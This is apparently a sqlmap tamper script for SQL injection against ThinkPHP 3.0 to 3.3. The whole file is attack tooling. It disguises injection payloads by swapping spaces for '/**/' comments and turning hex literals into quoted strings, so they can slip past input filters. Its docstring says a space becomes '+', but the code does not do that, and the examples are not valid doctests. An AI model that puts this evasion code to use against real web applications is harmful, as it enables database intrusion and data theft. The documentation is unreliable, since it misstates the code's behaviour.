#!/usr/bin/env python
"""
Copyright (c) 2015 xiaoL-pkav
"""
import os
import random
import re
import binascii

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against ThinkPHP 3.0~3.3" % (os.path.basename(__file__).split(".")[0]))

def tamper(payload, **kwargs):
    """
    Notes:
        * Useful to ThinkPHP

    Replace hex string

    >>> tamper("0x7163646271")
    ==> 'qcdbq'

    >>> tamper(" ")
    ==> '+'

    """
    blanks = '/**/';
    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace, end = False, False, False, False
        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += blanks
                    continue
            elif payload[i] == '\'':
                quote = not quote
            elif payload[i] == '"':
                doublequote = not doublequote
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                end = True
            elif payload[i] == " " and not doublequote and not quote:
                if end:
                    retVal += blanks[:-1]
                else:
                    retVal += blanks
                continue
            retVal += payload[i]

    retValArray = retVal.split();
    retTmpArray = []  
    p = re.compile(r'(0x\w+)')
    def func(m):
        tmp = m.group(1).replace('0x','')
        tmp = tmp.replace('\\','\\\\')
        return '\'%s\'' % binascii.a2b_hex(tmp)  

    for val in retValArray:
        retTmpArray.append(p.sub(func,val).replace(' ',blanks))
        
    return " ".join(retTmpArray)